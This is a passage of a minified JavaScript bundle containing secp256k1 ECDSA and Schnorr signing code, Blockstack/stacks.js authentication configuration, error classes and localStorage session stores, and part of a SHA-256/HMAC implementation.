          if (e.length % 2)
            throw new Error(
              "hexToBytes: received invalid unpadded hex" + e.length
            );
          const t = new Uint8Array(e.length / 2);
          for (let n = 0; n < t.length; n++) {
            const r = 2 * n,
              i = e.slice(r, r + 2),
              o = Number.parseInt(i, 16);
            if (Number.isNaN(o) || o < 0)
              throw new Error("Invalid byte sequence");
            t[n] = o;
          }
          return t;
        }
        function I(e) {
          return T(S(e));
        }
        function O(e) {
          return e instanceof Uint8Array ? Uint8Array.from(e) : C(e);
        }
        function B(e) {
          if ("number" === typeof e && Number.isSafeInteger(e) && e > 0)
            return BigInt(e);
          if ("bigint" === typeof e && D(e)) return e;
          throw new TypeError(
            "Expected valid private scalar: 0 < scalar < curve.n"
          );
        }
        function P(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : u.P;
          const n = e % t;
          return n >= i ? n : t + n;
        }
        function _(e, t) {
          const { P: n } = u;
          let r = e;
          for (; t-- > i; ) (r *= r), (r %= n);
          return r;
        }
        function U(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : u.P;
          if (e === i || t <= i)
            throw new Error(
              `invert: expected positive integers, got n=${e} mod=${t}`
            );
          let n = P(e, t),
            r = t,
            s = i,
            a = o,
            l = o,
            c = i;
          for (; n !== i; ) {
            const e = r / n,
              t = r % n,
              i = s - l * e,
              o = a - c * e;
            (r = n), (n = t), (s = l), (a = c), (l = i), (c = o);
          }
          if (r !== o) throw new Error("invert: does not exist");
          return P(s, t);
        }
        const N = (e, t) => (e + t / s) / t,
          R = s ** BigInt(128);
        function L(e) {
          const { n: t } = u,
            n = BigInt("0x3086d221a7d46bcde86c90e49284eb15"),
            r = -o * BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),
            i = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),
            s = n,
            a = N(s * e, t),
            l = N(-r * e, t);
          let c = P(e - a * n - l * i, t),
            f = P(-a * r - l * s, t);
          const h = c > R,
            d = f > R;
          if ((h && (c = t - c), d && (f = t - f), c > R || f > R))
            throw new Error("splitScalarEndo: Endomorphism failed, k=" + e);
          return { k1neg: h, k1: c, k2neg: d, k2: f };
        }
        function $(e) {
          const { n: t } = u,
            n = 8 * e.length - 256;
          let r = I(e);
          return n > 0 && (r >>= BigInt(n)), r >= t && (r -= t), r;
        }
        class H {
          constructor() {
            (this.v = new Uint8Array(32).fill(1)),
              (this.k = new Uint8Array(32).fill(0)),
              (this.counter = 0);
          }
          hmac() {
            for (var e = arguments.length, n = new Array(e), r = 0; r < e; r++)
              n[r] = arguments[r];
            return t.utils.hmacSha256(this.k, ...n);
          }
          hmacSync() {
            if ("function" !== typeof t.utils.hmacSha256Sync)
              throw new Error(
                "utils.hmacSha256Sync is undefined, you need to set it"
              );
            for (var e = arguments.length, n = new Array(e), r = 0; r < e; r++)
              n[r] = arguments[r];
            const i = t.utils.hmacSha256Sync(this.k, ...n);
            if (i instanceof Promise)
              throw new Error(
                "To use sync sign(), ensure utils.hmacSha256 is sync"
              );
            return i;
          }
          incr() {
            if (this.counter >= 1e3)
              throw new Error(
                "Tried 1,000 k values for sign(), all were invalid"
              );
            this.counter += 1;
          }
          async reseed() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : new Uint8Array();
            (this.k = await this.hmac(this.v, Uint8Array.from([0]), e)),
              (this.v = await this.hmac(this.v)),
              0 !== e.length &&
                ((this.k = await this.hmac(this.v, Uint8Array.from([1]), e)),
                (this.v = await this.hmac(this.v)));
          }
          reseedSync() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : new Uint8Array();
            (this.k = this.hmacSync(this.v, Uint8Array.from([0]), e)),
              (this.v = this.hmacSync(this.v)),
              0 !== e.length &&
                ((this.k = this.hmacSync(this.v, Uint8Array.from([1]), e)),
                (this.v = this.hmacSync(this.v)));
          }
          async generate() {
            return this.incr(), (this.v = await this.hmac(this.v)), this.v;
          }
          generateSync() {
            return this.incr(), (this.v = this.hmacSync(this.v)), this.v;
          }
        }
        function D(e) {
          return i < e && e < u.n;
        }
        function M(e) {
          return i < e && e < u.P;
        }
        function F(e, t, n) {
          const r = I(e);
          if (!D(r)) return;
          const { n: s } = u,
            a = g.BASE.multiply(r),
            l = P(a.x, s);
          if (l === i) return;
          const c = P(U(r, s) * P(t + n * l, s), s);
          if (c === i) return;
          const f = new m(l, c);
          return { sig: f, recovery: (a.x === f.r ? 0 : 2) | Number(a.y & o) };
        }
        function j(e) {
          let t;
          if ("bigint" === typeof e) t = e;
          else if ("number" === typeof e && Number.isSafeInteger(e) && e > 0)
            t = BigInt(e);
          else if ("string" === typeof e) {
            if (64 !== e.length)
              throw new Error("Expected 32 bytes of private key");
            t = T(e);
          } else {
            if (!v(e)) throw new TypeError("Expected valid private key");
            if (32 !== e.length)
              throw new Error("Expected 32 bytes of private key");
            t = I(e);
          }
          if (!D(t)) throw new Error("Expected private key: 0 < key < n");
          return t;
        }
        function z(e) {
          return e instanceof g ? (e.assertValidity(), e) : g.fromHex(e);
        }
        function K(e) {
          if (e instanceof m) return e.assertValidity(), e;
          try {
            return m.fromDER(e);
          } catch (t) {
            return m.fromCompact(e);
          }
        }
        function W(e) {
          const t = v(e),
            n = "string" === typeof e,
            r = (t || n) && e.length;
          return t
            ? 33 === r || 65 === r
            : n
            ? 66 === r || 130 === r
            : e instanceof g;
        }
        function V(e) {
          return I(e.length > 32 ? e.slice(0, 32) : e);
        }
        function q(e) {
          const t = V(e),
            n = P(t, u.n);
          return G(n < i ? t : n);
        }
        function G(e) {
          if ("bigint" !== typeof e) throw new Error("Expected bigint");
          return C(x(e));
        }
        function Y(e, n, r) {
          if (null == e)
            throw new Error(`sign: expected valid message hash, not "${e}"`);
          const i = O(e),
            o = j(n),
            s = [G(o), q(i)];
          if (null != r) {
            !0 === r && (r = t.utils.randomBytes(32));
            const e = O(r);
            if (32 !== e.length)
              throw new Error("sign: Expected 32 bytes of extra data");
            s.push(e);
          }
          return { seed: b(...s), m: V(i), d: o };
        }
        function Z(e, t) {
          let { sig: n, recovery: r } = e;
          const {
            canonical: i,
            der: o,
            recovered: s,
          } = Object.assign({ canonical: !0, der: !0 }, t);
          i && n.hasHighS() && ((n = n.normalizeS()), (r ^= 1));
          const a = o ? n.toDERRawBytes() : n.toCompactRawBytes();
          return s ? [a, r] : a;
        }
        (t.getPublicKey = function (e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
          return g.fromPrivateKey(e).toRawBytes(t);
        }),
          (t.recoverPublicKey = function (e, t, n) {
            let r =
              arguments.length > 3 && void 0 !== arguments[3] && arguments[3];
            return g.fromSignature(e, t, n).toRawBytes(r);
          }),
          (t.getSharedSecret = function (e, t) {
            let n =
              arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
            if (W(e))
              throw new TypeError(
                "getSharedSecret: first arg must be private key"
              );
            if (!W(t))
              throw new TypeError(
                "getSharedSecret: second arg must be public key"
              );
            const r = z(t);
            return r.assertValidity(), r.multiply(j(e)).toRawBytes(n);
          }),
          (t.sign = async function (e, t) {
            let n =
              arguments.length > 2 && void 0 !== arguments[2]
                ? arguments[2]
                : {};
            const { seed: r, m: i, d: o } = Y(e, t, n.extraEntropy);
            let s;
            const a = new H();
            for (await a.reseed(r); !(s = F(await a.generate(), i, o)); )
              await a.reseed();
            return Z(s, n);
          }),
          (t.signSync = function (e, t) {
            let n =
              arguments.length > 2 && void 0 !== arguments[2]
                ? arguments[2]
                : {};
            const { seed: r, m: i, d: o } = Y(e, t, n.extraEntropy);
            let s;
            const a = new H();
            for (a.reseedSync(r); !(s = F(a.generateSync(), i, o)); )
              a.reseedSync();
            return Z(s, n);
          });
        const J = { strict: !0 };
        function X(e) {
          return P(I(e), u.n);
        }
        function Q(e) {
          return (e.y & o) === i;
        }
        t.verify = function (e, t, n) {
          let r,
            i =
              arguments.length > 3 && void 0 !== arguments[3]
                ? arguments[3]
                : J;
          try {
            (r = K(e)), (t = O(t));
          } catch (y) {
            return !1;
          }
          const { r: o, s: s } = r;
          if (i.strict && r.hasHighS()) return !1;
          const a = $(t);
          let l;
          try {
            l = z(n);
          } catch (y) {
            return !1;
          }
          const { n: c } = u,
            f = U(s, c),
            h = P(a * f, c),
            d = P(o * f, c),
            p = g.BASE.multiplyAndAddUnsafe(l, h, d);
          return !!p && P(p.x, c) === o;
        };
        class ee {
          constructor(e, t) {
            (this.r = e), (this.s = t), this.assertValidity();
          }
          static fromHex(e) {
            const t = O(e);
            if (64 !== t.length)
              throw new TypeError(
                `SchnorrSignature.fromHex: expected 64 bytes, not ${t.length}`
              );
            const n = I(t.subarray(0, 32)),
              r = I(t.subarray(32, 64));
            return new ee(n, r);
          }
          assertValidity() {
            const { r: e, s: t } = this;
            if (!M(e) || !D(t)) throw new Error("Invalid signature");
          }
          toHex() {
            return x(this.r) + x(this.s);
          }
          toRawBytes() {
            return C(this.toHex());
          }
        }
        function te(e, t, n) {
          if (null == e)
            throw new TypeError(`sign: Expected valid message, not "${e}"`);
          const r = O(e),
            i = j(t),
            o = O(n);
          if (32 !== o.length)
            throw new TypeError("sign: Expected 32 bytes of aux randomness");
          const s = g.fromPrivateKey(i),
            a = s.toRawX();
          return { m: r, P: s, px: a, d: Q(s) ? i : u.n - i, rand: o };
        }
        function ne(e, t) {
          return A(e ^ I(t));
        }
        function re(e) {
          const t = P(I(e), u.n);
          if (t === i)
            throw new Error("sign: Creation of signature failed. k is zero");
          const n = g.fromPrivateKey(t),
            r = n.toRawX();
          return { R: n, rx: r, k: Q(n) ? t : u.n - t };
        }
        function ie(e, t, n, r) {
          return new ee(e.x, P(t + n * r, u.n)).toRawBytes();
        }
        function oe(e, t, n) {
          const r = e instanceof ee,
            i = r ? e : ee.fromHex(e);
          return r && i.assertValidity(), { ...i, m: O(t), P: z(n) };
        }
        function se(e, t, n, r) {
          const i = g.BASE.multiplyAndAddUnsafe(t, j(n), P(-r, u.n));
          return !(!i || !Q(i) || i.x !== e);
        }
        async function ae(e, n, r) {
          try {
            const { r: i, s: o, m: s, P: a } = oe(e, n, r),
              l = X(
                await t.utils.taggedHash(ue.challenge, A(i), a.toRawX(), s)
              );
            return se(i, a, o, l);
          } catch (i) {
            return !1;
          }
        }
        function le(e, n, r) {
          try {
            const { r: i, s: o, m: s, P: a } = oe(e, n, r),
              l = X(t.utils.taggedHashSync(ue.challenge, A(i), a.toRawX(), s));
            return se(i, a, o, l);
          } catch (i) {
            return !1;
          }
        }
        (t.schnorr = {
          Signature: ee,
          getPublicKey: function (e) {
            return g.fromPrivateKey(e).toRawX();
          },
          sign: async function (e, n) {
            let r =
              arguments.length > 2 && void 0 !== arguments[2]
                ? arguments[2]
                : t.utils.randomBytes();
            const { m: i, px: o, d: s, rand: a } = te(e, n, r),
              l = ne(s, await t.utils.taggedHash(ue.aux, a)),
              {
                R: c,
                rx: u,
                k: f,
              } = re(await t.utils.taggedHash(ue.nonce, l, o, i)),
              h = ie(
                c,
                f,
                X(await t.utils.taggedHash(ue.challenge, u, o, i)),
                s
              );
            if (!(await ae(h, i, o)))
              throw new Error("sign: Invalid signature produced");
            return h;
          },
          verify: ae,
          signSync: function (e, n) {
            let r =
              arguments.length > 2 && void 0 !== arguments[2]
                ? arguments[2]
                : t.utils.randomBytes();
            const { m: i, px: o, d: s, rand: a } = te(e, n, r),
              l = ne(s, t.utils.taggedHashSync(ue.aux, a)),
              {
                R: c,
                rx: u,
                k: f,
              } = re(t.utils.taggedHashSync(ue.nonce, l, o, i)),
              h = ie(c, f, X(t.utils.taggedHashSync(ue.challenge, u, o, i)), s);
            if (!le(h, i, o))
              throw new Error("sign: Invalid signature produced");
            return h;
          },
          verifySync: le,
        }),
          g.BASE._setWindowSize(8);
        const ce = {
            node: r,
            web:
              "object" === typeof self && "crypto" in self
                ? self.crypto
                : void 0,
          },
          ue = {
            challenge: "BIP0340/challenge",
            aux: "BIP0340/aux",
            nonce: "BIP0340/nonce",
          },
          fe = {};
        t.utils = {
          isValidPrivateKey(e) {
            try {
              return j(e), !0;
            } catch (t) {
              return !1;
            }
          },
          privateAdd: (e, t) => A(P(j(e) + j(t), u.n)),
          privateNegate: (e) => {
            const t = j(e);
            return A(u.n - t);
          },
          pointAddScalar: (e, t, n) => {
            const r = g.fromHex(e),
              i = j(t),
              s = g.BASE.multiplyAndAddUnsafe(r, i, o);
            if (!s) throw new Error("Tweaked point at infinity");
            return s.toRawBytes(n);
          },
          pointMultiply: (e, t, n) => {
            const r = g.fromHex(e),
              i = I(O(t));
            return r.multiply(i).toRawBytes(n);
          },
          hashToPrivateKey: (e) => {
            if ((e = O(e)).length < 40 || e.length > 1024)
              throw new Error(
                "Expected 40-1024 bytes of private key as per FIPS 186"
              );
            return A(P(I(e), u.n - o) + o);
          },
          randomBytes: function () {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : 32;
            if (ce.web) return ce.web.getRandomValues(new Uint8Array(e));
            if (ce.node) {
              const { randomBytes: t } = ce.node;
              return Uint8Array.from(t(e));
            }
            throw new Error(
              "The environment doesn't have randomBytes function"
            );
          },
          randomPrivateKey: () =>
            t.utils.hashToPrivateKey(t.utils.randomBytes(40)),
          bytesToHex: S,
          hexToBytes: C,
          concatBytes: b,
          mod: P,
          invert: U,
          sha256: async function () {
            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
              t[n] = arguments[n];
            if (ce.web) {
              const e = await ce.web.subtle.digest("SHA-256", b(...t));
              return new Uint8Array(e);
            }
            if (ce.node) {
              const { createHash: e } = ce.node,
                n = e("sha256");
              return t.forEach((e) => n.update(e)), Uint8Array.from(n.digest());
            }
            throw new Error("The environment doesn't have sha256 function");
          },
          hmacSha256: async function (e) {
            for (
              var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1;
              r < t;
              r++
            )
              n[r - 1] = arguments[r];
            if (ce.web) {
              const t = await ce.web.subtle.importKey(
                  "raw",
                  e,
                  { name: "HMAC", hash: { name: "SHA-256" } },
                  !1,
                  ["sign"]
                ),
                r = b(...n),
                i = await ce.web.subtle.sign("HMAC", t, r);
              return new Uint8Array(i);
            }
            if (ce.node) {
              const { createHmac: t } = ce.node,
                r = t("sha256", e);
              return n.forEach((e) => r.update(e)), Uint8Array.from(r.digest());
            }
            throw new Error(
              "The environment doesn't have hmac-sha256 function"
            );
          },
          sha256Sync: void 0,
          hmacSha256Sync: void 0,
          taggedHash: async function (e) {
            let n = fe[e];
            if (void 0 === n) {
              const r = await t.utils.sha256(
                Uint8Array.from(e, (e) => e.charCodeAt(0))
              );
              (n = b(r, r)), (fe[e] = n);
            }
            for (
              var r = arguments.length, i = new Array(r > 1 ? r - 1 : 0), o = 1;
              o < r;
              o++
            )
              i[o - 1] = arguments[o];
            return t.utils.sha256(n, ...i);
          },
          taggedHashSync: function (e) {
            if ("function" !== typeof t.utils.sha256Sync)
              throw new Error(
                "utils.sha256Sync is undefined, you need to set it"
              );
            let n = fe[e];
            if (void 0 === n) {
              const r = t.utils.sha256Sync(
                Uint8Array.from(e, (e) => e.charCodeAt(0))
              );
              (n = b(r, r)), (fe[e] = n);
            }
            for (
              var r = arguments.length, i = new Array(r > 1 ? r - 1 : 0), o = 1;
              o < r;
              o++
            )
              i[o - 1] = arguments[o];
            return t.utils.sha256Sync(n, ...i);
          },
          precompute() {
            let e =
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : 8,
              t =
                arguments.length > 1 && void 0 !== arguments[1]
                  ? arguments[1]
                  : g.BASE;
            const n = t === g.BASE ? t : new g(t.x, t.y);
            return n._setWindowSize(e), n.multiply(a), n;
          },
        };
      },
      8674: (e, t, n) => {
        "use strict";
        n.d(t, { X: () => o });
        var r = n(6659),
          i = n(9083);
        class o {
          constructor() {
            var e;
            let t =
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : r.f3.slice(),
              n =
                arguments.length > 1 && void 0 !== arguments[1]
                  ? arguments[1]
                  : null ===
                      (e = (0, i.Rf)("location", { returnEmptyObject: !0 })) ||
                    void 0 === e
                  ? void 0
                  : e.origin,
              o =
                arguments.length > 2 && void 0 !== arguments[2]
                  ? arguments[2]
                  : "",
              s =
                arguments.length > 3 && void 0 !== arguments[3]
                  ? arguments[3]
                  : "/manifest.json",
              a =
                arguments.length > 4 && void 0 !== arguments[4]
                  ? arguments[4]
                  : void 0,
              l =
                arguments.length > 5 && void 0 !== arguments[5]
                  ? arguments[5]
                  : r._G;
            (this.appDomain = n),
              (this.scopes = t),
              (this.redirectPath = o),
              (this.manifestPath = s),
              (this.coreNode = a),
              (this.authenticatorURL = l);
          }
          redirectURI() {
            return `${this.appDomain}${this.redirectPath}`;
          }
          manifestURI() {
            return `${this.appDomain}${this.manifestPath}`;
          }
        }
      },
      6659: (e, t, n) => {
        "use strict";
        n.d(t, { _G: () => r, aL: () => s, f3: () => o, lB: () => i });
        const r = "https://browser.blockstack.org/auth",
          i = { "@type": "Person", "@context": "http://schema.org" },
          o = ["store_write"],
          s = "blockstack-session";
      },
      2845: (e, t, n) => {
        "use strict";
        n.d(t, { V: () => sn });
        var r = n(8674);
        const i = {
          MISSING_PARAMETER: "missing_parameter",
          REMOTE_SERVICE_ERROR: "remote_service_error",
          INVALID_STATE: "invalid_state",
          NO_SESSION_DATA: "no_session_data",
          DOES_NOT_EXIST: "does_not_exist",
          FAILED_DECRYPTION_ERROR: "failed_decryption_error",
          INVALID_DID_ERROR: "invalid_did_error",
          NOT_ENOUGH_FUNDS_ERROR: "not_enough_error",
          INVALID_AMOUNT_ERROR: "invalid_amount_error",
          LOGIN_FAILED_ERROR: "login_failed",
          SIGNATURE_VERIFICATION_ERROR: "signature_verification_failure",
          CONFLICT_ERROR: "conflict_error",
          NOT_ENOUGH_PROOF_ERROR: "not_enough_proof_error",
          BAD_PATH_ERROR: "bad_path_error",
          VALIDATION_ERROR: "validation_error",
          PAYLOAD_TOO_LARGE_ERROR: "payload_too_large_error",
          PRECONDITION_FAILED_ERROR: "precondition_failed_error",
          UNKNOWN: "unknown",
        };
        Object.freeze(i);
        class o extends Error {
          constructor(e) {
            super();
            let t = e.message,
              n = `Error Code: ${e.code}`,
              r = this.stack;
            if (r) n += `Stack Trace:\n${r}`;
            else
              try {
                throw new Error();
              } catch (i) {
                r = i.stack;
              }
            (t += `\nIf you believe this exception is caused by a bug in stacks.js,\n      please file a bug report: https://github.com/blockstack/stacks.js/issues\n\n${n}`),
              (this.message = t),
              (this.code = e.code),
              (this.parameter = e.parameter ? e.parameter : void 0);
          }
          toString() {
            return `${super.toString()}\n    code: ${this.code} param: ${
              this.parameter ? this.parameter : "n/a"
            }`;
          }
        }
        class s extends o {
          constructor(e) {
            super({
              code: i.MISSING_PARAMETER,
              message:
                arguments.length > 1 && void 0 !== arguments[1]
                  ? arguments[1]
                  : "",
              parameter: e,
            }),
              (this.name = "MissingParametersError");
          }
        }
        class a extends o {
          constructor() {
            super({
              code: i.INVALID_DID_ERROR,
              message:
                arguments.length > 0 && void 0 !== arguments[0]
                  ? arguments[0]
                  : "",
            }),
              (this.name = "InvalidDIDError");
          }
        }
        class l extends o {
          constructor(e) {
            const t = `Failed to login: ${e}`;
            super({ code: i.LOGIN_FAILED_ERROR, message: t }),
              (this.message = t),
              (this.name = "LoginFailedError");
          }
        }
        class c extends o {
          constructor() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : "Unable to decrypt cipher object.";
            super({ code: i.FAILED_DECRYPTION_ERROR, message: e }),
              (this.message = e),
              (this.name = "FailedDecryptionError");
          }
        }
        class u extends o {
          constructor(e) {
            super({ code: i.INVALID_STATE, message: e }),
              (this.message = e),
              (this.name = "InvalidStateError");
          }
        }
        class f extends o {
          constructor(e) {
            super({ code: i.INVALID_STATE, message: e }),
              (this.message = e),
              (this.name = "NoSessionDataError");
          }
        }
        const h = "1.0.0";
        class d {
          constructor(e) {
            (this.version = h),
              (this.userData = e.userData),
              (this.transitKey = e.transitKey),
              (this.etags = e.etags ? e.etags : {});
          }
          static fromJSON(e) {
            if (e.version !== h)
              throw new u(
                `JSON data version ${e.version} not supported by SessionData`
              );
            const t = {
              coreNode: e.coreNode,
              userData: e.userData,
              transitKey: e.transitKey,
              etags: e.etags,
            };
            return new d(t);
          }
          toString() {
            return JSON.stringify(this);
          }
        }
        var p = n(6659);
        class g {
          constructor(e) {
            if (e) {
              const t = new d(e);
              this.setSessionData(t);
            }
          }
          getSessionData() {
            throw new Error("Abstract class");
          }
          setSessionData(e) {
            throw new Error("Abstract class");
          }
          deleteSessionData() {
            throw new Error("Abstract class");
          }
        }
        class y extends g {
          constructor(e) {
            super(e), this.sessionData || this.setSessionData(new d({}));
          }
          getSessionData() {
            if (!this.sessionData) throw new f("No session data was found.");
            return this.sessionData;
          }
          setSessionData(e) {
            return (this.sessionData = e), !0;
          }
          deleteSessionData() {
            return this.setSessionData(new d({})), !0;
          }
        }
        class w extends g {
          constructor(e) {
            super(e),
              e &&
              e.storeOptions &&
              e.storeOptions.localStorageKey &&
              "string" === typeof e.storeOptions.localStorageKey
                ? (this.key = e.storeOptions.localStorageKey)
                : (this.key = p.aL);
            if (!localStorage.getItem(this.key)) {
              const e = new d({});
              this.setSessionData(e);
            }
          }
          getSessionData() {
            const e = localStorage.getItem(this.key);
            if (!e) throw new f("No session data was found in localStorage");
            const t = JSON.parse(e);
            return d.fromJSON(t);
          }
          setSessionData(e) {
            return localStorage.setItem(this.key, e.toString()), !0;
          }
          deleteSessionData() {
            return (
              localStorage.removeItem(this.key),
              this.setSessionData(new d({})),
              !0
            );
          }
        }
        var m = n(4563);
        function b(e) {
          if (!Number.isSafeInteger(e) || e < 0)
            throw new Error(`Wrong positive integer: ${e}`);
        }
        function v(e) {
          if (!(e instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
          for (
            var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1;
            r < t;
            r++
          )
            n[r - 1] = arguments[r];
          if (n.length > 0 && !n.includes(e.length))
            throw new TypeError(
              `Expected Uint8Array of length ${n}, not of length=${e.length}`
            );
        }
        const E = {
            number: b,
            bool: function (e) {
              if ("boolean" !== typeof e)
                throw new Error(`Expected boolean, not ${e}`);
            },
            bytes: v,
            hash: function (e) {
              if ("function" !== typeof e || "function" !== typeof e.create)
                throw new Error(
                  "Hash should be wrapped by utils.wrapConstructor"
                );
              b(e.outputLen), b(e.blockLen);
            },
            exists: function (e) {
              let t =
                !(arguments.length > 1 && void 0 !== arguments[1]) ||
                arguments[1];
              if (e.destroyed)
                throw new Error("Hash instance has been destroyed");
              if (t && e.finished)
                throw new Error("Hash#digest() has already been called");
            },
            output: function (e, t) {
              v(e);
              const n = t.outputLen;
              if (e.length < n)
                throw new Error(
                  `digestInto() expects output buffer of length at least ${n}`
                );
            },
          },
          S = E,
          x =
            ("object" === typeof self && "crypto" in self && self.crypto,
            (e) => new DataView(e.buffer, e.byteOffset, e.byteLength)),
          A = (e, t) => (e << (32 - t)) | (e >>> t);
        if (!(68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0]))
          throw new Error("Non little-endian hardware is not supported");
        Array.from({ length: 256 }, (e, t) => t.toString(16).padStart(2, "0"));
        function k(e) {
          if (
            ("string" === typeof e &&
              (e = (function (e) {
                if ("string" !== typeof e)
                  throw new TypeError(
                    "utf8ToBytes expected string, got " + typeof e
                  );
                return new TextEncoder().encode(e);
              })(e)),
            !(e instanceof Uint8Array))
          )
            throw new TypeError(
              `Expected input type is Uint8Array (got ${typeof e})`
            );
          return e;
        }
        class T {
          clone() {
            return this._cloneInto();
          }
        }
        function C(e) {
          const t = (t) => e().update(k(t)).digest(),
            n = e();
          return (
            (t.outputLen = n.outputLen),
            (t.blockLen = n.blockLen),
            (t.create = () => e()),
            t
          );
        }
        class I extends T {
          constructor(e, t) {
            super(), (this.finished = !1), (this.destroyed = !1), S.hash(e);
            const n = k(t);
            if (
              ((this.iHash = e.create()),
              "function" !== typeof this.iHash.update)
            )
              throw new TypeError(
                "Expected instance of class which extends utils.Hash"
              );
            (this.blockLen = this.iHash.blockLen),
              (this.outputLen = this.iHash.outputLen);
            const r = this.blockLen,
              i = new Uint8Array(r);
            i.set(n.length > r ? e.create().update(n).digest() : n);
            for (let o = 0; o < i.length; o++) i[o] ^= 54;
            this.iHash.update(i), (this.oHash = e.create());
            for (let o = 0; o < i.length; o++) i[o] ^= 106;
            this.oHash.update(i), i.fill(0);
          }
          update(e) {
            return S.exists(this), this.iHash.update(e), this;
          }
          digestInto(e) {
            S.exists(this),
              S.bytes(e, this.outputLen),
              (this.finished = !0),
              this.iHash.digestInto(e),
              this.oHash.update(e),
              this.oHash.digestInto(e),
              this.destroy();
          }
          digest() {
            const e = new Uint8Array(this.oHash.outputLen);
            return this.digestInto(e), e;
          }
          _cloneInto(e) {
            e || (e = Object.create(Object.getPrototypeOf(this), {}));
            const {
              oHash: t,
              iHash: n,
              finished: r,
              destroyed: i,
              blockLen: o,
              outputLen: s,
            } = this;
            return (
              (e.finished = r),
              (e.destroyed = i),
              (e.blockLen = o),
              (e.outputLen = s),
              (e.oHash = t._cloneInto(e.oHash)),
              (e.iHash = n._cloneInto(e.iHash)),
              e
            );
          }
          destroy() {
            (this.destroyed = !0), this.oHash.destroy(), this.iHash.destroy();
          }
        }
        const O = (e, t, n) => new I(e, t).update(n).digest();
        O.create = (e, t) => new I(e, t);
        class B extends T {
          constructor(e, t, n, r) {
            super(),
              (this.blockLen = e),
              (this.outputLen = t),
              (this.padOffset = n),
              (this.isLE = r),
              (this.finished = !1),
              (this.length = 0),
              (this.pos = 0),
              (this.destroyed = !1),
              (this.buffer = new Uint8Array(e)),
              (this.view = x(this.buffer));
          }
          update(e) {
            S.exists(this);
            const { view: t, buffer: n, blockLen: r } = this,
              i = (e = k(e)).length;
            for (let o = 0; o < i; ) {
              const s = Math.min(r - this.pos, i - o);
              if (s !== r)
                n.set(e.subarray(o, o + s), this.pos),
                  (this.pos += s),
                  (o += s),
                  this.pos === r && (this.process(t, 0), (this.pos = 0));
              else {
                const t = x(e);
                for (; r <= i - o; o += r) this.process(t, o);
              }
            }
            return (this.length += e.length), this.roundClean(), this;
          }
          digestInto(e) {
            S.exists(this), S.output(e, this), (this.finished = !0);
            const { buffer: t, view: n, blockLen: r, isLE: i } = this;
            let { pos: o } = this;
            (t[o++] = 128),
              this.buffer.subarray(o).fill(0),
              this.padOffset > r - o && (this.process(n, 0), (o = 0));
            for (let u = o; u < r; u++) t[u] = 0;
            !(function (e, t, n, r) {
              if ("function" === typeof e.setBigUint64)
                return e.setBigUint64(t, n, r);
              const i = BigInt(32),
                o = BigInt(4294967295),
                s = Number((n >> i) & o),
                a = Number(n & o),
                l = r ? 4 : 0,
                c = r ? 0 : 4;
              e.setUint32(t + l, s, r), e.setUint32(t + c, a, r);
            })(n, r - 8, BigInt(8 * this.length), i),
              this.process(n, 0);
            const s = x(e),
              a = this.outputLen;
            if (a % 4)
              throw new Error("_sha2: outputLen should be aligned to 32bit");
            const l = a / 4,
              c = this.get();
            if (l > c.length)
              throw new Error("_sha2: outputLen bigger than state");
            for (let u = 0; u < l; u++) s.setUint32(4 * u, c[u], i);
          }
          digest() {
            const { buffer: e, outputLen: t } = this;
            this.digestInto(e);
            const n = e.slice(0, t);
            return this.destroy(), n;
          }
          _cloneInto(e) {
            e || (e = new this.constructor()), e.set(...this.get());
            const {
              blockLen: t,
              buffer: n,
              length: r,
              finished: i,
              destroyed: o,
              pos: s,
            } = this;
            return (
              (e.length = r),
              (e.pos = s),
              (e.finished = i),
              (e.destroyed = o),
              r % t && e.buffer.set(n),
              e
            );
          }
        }
        const P = (e, t, n) => (e & t) ^ (e & n) ^ (t & n),
          _ = new Uint32Array([
            1116352408, 1899447441, 3049323471, 3921009573, 961987163,
            1508970993, 2453635748, 2870763221, 3624381080, 310598401,
            607225278, 1426881987, 1925078388, 2162078206, 2614888103,
            3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983,
            1249150122, 1555081692, 1996064986, 2554220882, 2821834349,
            2952996808, 3210313671, 3336571891, 3584528711, 113926993,
            338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700,
            1986661051, 2177026350, 2456956037, 2730485921, 2820302411,
            3259730800, 3345764771, 3516065817, 3600352804, 4094571909,
            275423344, 430227734, 506948616, 659060556, 883997877, 958139571,
            1322822218, 1537002063, 1747873779, 1955562222, 2024104815,
            2227730452, 2361852424, 2428436474, 2756734187, 3204031479,
            3329325298,
          ]),
          U = new Uint32Array([
            1779033703, 3144134277, 1013904242, 2773480762, 1359893119,
            2600822924, 528734635, 1541459225,
          ]),
          N = new Uint32Array(64);
        class R extends B {
          constructor() {
            super(64, 32, 8, !1),
              (this.A = 0 | U[0]),
              (this.B = 0 | U[1]),
              (this.C = 0 | U[2]),
              (this.D = 0 | U[3]),
              (this.E = 0 | U[4]),
              (this.F = 0 | U[5]),
              (this.G = 0 | U[6]),
              (this.H = 0 | U[7]);
          }
          get() {
            const { A: e, B: t, C: n, D: r, E: i, F: o, G: s, H: a } = this;
            return [e, t, n, r, i, o, s, a];
          }
          set(e, t, n, r, i, o, s, a) {
            (this.A = 0 | e),
              (this.B = 0 | t),
              (this.C = 0 | n),
              (this.D = 0 | r),
              (this.E = 0 | i),
              (this.F = 0 | o),
              (this.G = 0 | s),
              (this.H = 0 | a);
          }
          process(e, t) {
            for (let f = 0; f < 16; f++, t += 4) N[f] = e.getUint32(t, !1);
            for (let f = 16; f < 64; f++) {
              const e = N[f - 15],
                t = N[f - 2],
